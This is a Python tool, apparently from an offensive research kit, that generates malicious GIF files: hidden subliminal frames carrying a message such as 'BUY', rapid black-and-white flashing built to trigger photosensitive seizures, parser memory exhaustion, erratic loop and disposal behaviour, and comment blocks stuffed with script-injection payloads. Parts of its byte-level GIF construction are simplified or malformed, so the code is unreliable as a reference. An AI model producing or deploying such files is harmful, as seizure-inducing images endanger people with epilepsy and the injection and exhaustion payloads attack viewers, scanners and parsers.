#!/usr/bin/env python3
"""
🎬 GIF Temporal Attack Module
Temporal manipulation attacks via GIF animation

Author: frankSx <fixes.it.frank@googlesmail.com>
13th Hour Research Division

Exploits frame timing, loop behavior, and subliminal messaging
in temporal ML models and human perception.
"""

import argparse
import struct
from typing import List, Tuple, Optional
import random


class GIFTemporalAttacker:
    """Generate malicious GIF files"""

    def __init__(self, seed: int = None):
        if seed:
            random.seed(seed)

    def generate_subliminal_frames(self,
                                   width: int = 200,
                                   height: int = 200,
                                   normal_frames: int = 10,
                                   inject_frames: int = 3,
                                   message: str = "BUY") -> bytes:
        """
        Generate GIF with subliminal message injection

        Inserts hidden frames between normal frames
        with very short display times (1-3ms)
        """
        # This is a simplified representation
        # Real implementation would use PIL or imageio

        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'global_color_table': self._create_color_table(),
            'frames': [],
            'trailer': b'\x3B'
        }

        # Generate normal frames (100ms each)
        for i in range(normal_frames):
            frame_data = self._create_graphic_control_extension(100)  # 100ms
            frame_data += self._create_image_descriptor(width, height)
            frame_data += self._create_image_data(f"frame_{i}")
            gif_structure['frames'].append(frame_data)

            # Inject subliminal frames (2ms each)
            if i % 3 == 0 and inject_frames > 0:
                for j in range(inject_frames):
                    subliminal = self._create_graphic_control_extension(2)  # 2ms
                    subliminal += self._create_image_descriptor(width, height)
                    subliminal += self._create_image_data(f"SUBLIMINAL_{message}_{j}")
                    gif_structure['frames'].append(subliminal)

        return self._assemble_gif(gif_structure)

    def generate_epileptic_trigger(self,
                                   width: int = 200,
                                   height: int = 200,
                                   flash_frequency: float = 15.0) -> bytes:
        """
        Generate GIF with rapid flashing (epilepsy warning)

        Creates alternating black/white frames at specified frequency.
        WARNING: Can trigger photosensitive epilepsy.
        """
        frame_delay = int(100 / flash_frequency)  # hundredths of second

        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'global_color_table': b'\x00\x00\x00\xFF\xFF\xFF',  # Black, White
            'frames': [],
            'trailer': b'\x3B'
        }

        # Create 60 frames (2 seconds at 30fps)
        for i in range(60):
            color_index = i % 2  # Alternate 0 (black) and 1 (white)
            frame = self._create_graphic_control_extension(frame_delay)
            frame += self._create_image_descriptor(width, height)
            frame += self._create_solid_frame(width, height, color_index)
            gif_structure['frames'].append(frame)

        return self._assemble_gif(gif_structure)

    def generate_memory_exhaustion(self,
                                   width: int = 1000,
                                   height: int = 1000,
                                   frame_count: int = 10000) -> bytes:
        """
        Generate GIF designed to exhaust parser memory

        Uses maximum dimensions and extreme frame counts
        with unique color tables per frame.
        """
        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'frames': [],
            'trailer': b'\x3B'
        }

        for i in range(min(frame_count, 1000)):  # Cap for safety
            # Each frame has local color table (memory intensive)
            frame = self._create_graphic_control_extension(1)
            frame += self._create_image_descriptor(width, height, local_table=True)
            frame += self._create_large_color_table()
            frame += self._create_image_data(f"frame_{i}")
            gif_structure['frames'].append(frame)

        return self._assemble_gif(gif_structure)

    def generate_loop_confusion(self,
                               width: int = 200,
                               height: int = 200) -> bytes:
        """
        Generate GIF with confusing loop behavior

        Uses Netscape Loop extension with edge cases.
        """
        # Netscape Loop Block with unusual values
        loop_block = b'\x21\xFF\x0BNETSCAPE2.0\x03\x01'
        loop_count = struct.pack('<H', 0)  # 0 = infinite
        loop_block += loop_count + b'\x00'

        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'application_extension': loop_block,
            'frames': [],
            'trailer': b'\x3B'
        }

        # Create frames with inconsistent timing
        delays = [1, 100, 1, 100, 1, 1000, 1]  # Erratic timing

        for i, delay in enumerate(delays * 10):
            frame = self._create_graphic_control_extension(delay)
            frame += self._create_image_descriptor(width, height)
            frame += self._create_image_data(f"frame_{i}")
            gif_structure['frames'].append(frame)

        return self._assemble_gif(gif_structure)

    def generate_comment_injection(self,
                                   width: int = 200,
                                   height: int = 200,
                                   payload: str = "<script>alert(1)</script>") -> bytes:
        """
        Generate GIF with comment extension injection

        Embeds arbitrary data in comment blocks that may
        be parsed by naive security scanners.
        """
        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'comments': [],
            'frames': [],
            'trailer': b'\x3B'
        }

        # Add many comment blocks with various payloads
        comments = [
            payload,
            "GIF89a" + payload,
            "<!--" + payload + "-->",
            "javascript:" + payload,
            "data:text/html," + payload,
        ]

        for comment in comments:
            gif_structure['comments'].append(self._create_comment_block(comment))

        # Add normal frame
        frame = self._create_graphic_control_extension(100)
        frame += self._create_image_descriptor(width, height)
        frame += self._create_image_data("normal")
        gif_structure['frames'].append(frame)

        return self._assemble_gif(gif_structure)

    def generate_frame_disposal_attack(self,
                                      width: int = 200,
                                      height: int = 200) -> bytes:
        """
        Generate GIF with confusing disposal methods

        Exploits different frame disposal methods to create
        unexpected compositing behavior.
        """
        disposal_methods = [0, 1, 2, 3]  # Various disposal methods

        gif_structure = {
            'header': b'GIF89a',
            'logical_screen': self._create_logical_screen(width, height),
            'frames': [],
            'trailer': b'\x3B'
        }

        for i in range(20):
            disposal = random.choice(disposal_methods)
            transparent = random.choice([True, False])

            frame = self._create_graphic_control_extension(
                delay=50,
                disposal=disposal,
                transparent=transparent
            )
            frame += self._create_image_descriptor(
                width, height,
                left=random.randint(0, width//2),
                top=random.randint(0, height//2)
            )
            frame += self._create_image_data(f"frame_{i}")
            gif_structure['frames'].append(frame)

        return self._assemble_gif(gif_structure)

    # Helper methods for GIF structure
    def _create_logical_screen(self, width: int, height: int) -> bytes:
        """Create Logical Screen Descriptor"""
        # Width, Height, Packed Field, Background Color, Aspect Ratio
        packed = 0x80 | (0x7 << 4) | 0x7  # Global color table flag, color resolution, sorted, size
        return struct.pack('<HH', width, height) + bytes([packed, 0, 0])

    def _create_color_table(self) -> bytes:
        """Create Global Color Table (256 colors)"""
        return bytes([i % 256 for i in range(768)])  # 256 RGB values

    def _create_large_color_table(self) -> bytes:
        """Create maximum size local color table"""
        return bytes(random.randint(0, 255) for _ in range(768))

    def _create_graphic_control_extension(self, 
                                         delay: int,
                                         disposal: int = 0,
                                         transparent: bool = False) -> bytes:
        """Create Graphic Control Extension"""
        packed = (disposal << 2) | (1 if transparent else 0)
        return bytes([0x21, 0xF9, 0x04, packed, 0, delay, 0, 0])

    def _create_image_descriptor(self,
                                width: int,
                                height: int,
                                left: int = 0,
                                top: int = 0,
                                local_table: bool = False) -> bytes:
        """Create Image Descriptor"""
        packed = 0x80 if local_table else 0x00  # Local color table flag
        return bytes([0x2C]) + struct.pack('<HHHH', left, top, width, height) + bytes([packed])

    def _create_image_data(self, identifier: str) -> bytes:
        """Create minimal image data (LZW compressed)"""
        # Simplified - real implementation would compress actual image data
        return bytes([0x02, 0x44, 0x01, 0x00])  # Minimal valid LZW stream

    def _create_solid_frame(self, width: int, height: int, color_index: int) -> bytes:
        """Create solid color frame data"""
        # Simplified representation
        return bytes([0x02, color_index, 0x00])

    def _create_comment_block(self, text: str) -> bytes:
        """Create Comment Extension block"""
        text_bytes = text.encode('utf-8')
        chunks = []
        # Split into 255-byte chunks
        for i in range(0, len(text_bytes), 255):
            chunk = text_bytes[i:i+255]
            chunks.append(bytes([len(chunk)]) + chunk)
        return bytes([0x21, 0xFE]) + b''.join(chunks) + b'\x00'

    def _assemble_gif(self, structure: dict) -> bytes:
        """Assemble GIF from structure"""
        gif = structure['header']
        gif += structure['logical_screen']

        if 'global_color_table' in structure:
            gif += structure['global_color_table']

        if 'application_extension' in structure:
            gif += structure['application_extension']

        if 'comments' in structure:
            for comment in structure['comments']:
                gif += comment

        for frame in structure['frames']:
            gif += frame

        gif += structure['trailer']
        return gif


def main():
    parser = argparse.ArgumentParser(description='🎬 GHOSTBYTE GIF Temporal Attack Generator')
    parser.add_argument('--mode',
                       choices=['subliminal', 'epileptic', 'memory', 'loop', 'comment', 'disposal'],
                       required=True,
                       help='Attack mode (WARNING: epileptic can trigger seizures)')
    parser.add_argument('--output', '-o', default='attack.gif')
    parser.add_argument('--width', type=int, default=200)
    parser.add_argument('--height', type=int, default=200)
    parser.add_argument('--message', default='BUY')
    parser.add_argument('--frames', type=int, default=10)
    parser.add_argument('--seed', type=int)

    args = parser.parse_args()

    if args.mode == 'epileptic':
        print("⚠️  WARNING: This generates rapid flashing that can trigger photosensitive epilepsy!")
        print("⚠️  Only use in controlled research environments with proper warnings.")
        confirm = input("Type 'CONFIRM' to proceed: ")
        if confirm != 'CONFIRM':
            print("Aborted.")
            return

    attacker = GIFTemporalAttacker(seed=args.seed)

    if args.mode == 'subliminal':
        result = attacker.generate_subliminal_frames(
            args.width, args.height, args.frames, 3, args.message
        )
    elif args.mode == 'epileptic':
        result = attacker.generate_epileptic_trigger(args.width, args.height, 15.0)
    elif args.mode == 'memory':
        result = attacker.generate_memory_exhaustion(args.width, args.height, args.frames)
    elif args.mode == 'loop':
        result = attacker.generate_loop_confusion(args.width, args.height)
    elif args.mode == 'comment':
        result = attacker.generate_comment_injection(args.width, args.height, args.message)
    elif args.mode == 'disposal':
        result = attacker.generate_frame_disposal_attack(args.width, args.height)

    with open(args.output, 'wb') as f:
        f.write(result)

    print(f"🎬 GIF attack generated: {args.output}")
    print(f"   Mode: {args.mode}")
    print(f"   Size: {len(result)} bytes")
    if args.mode == 'subliminal':
        print(f"   Message: '{args.message}' hidden in {args.frames} frames")


if __name__ == '__main__':
    main()
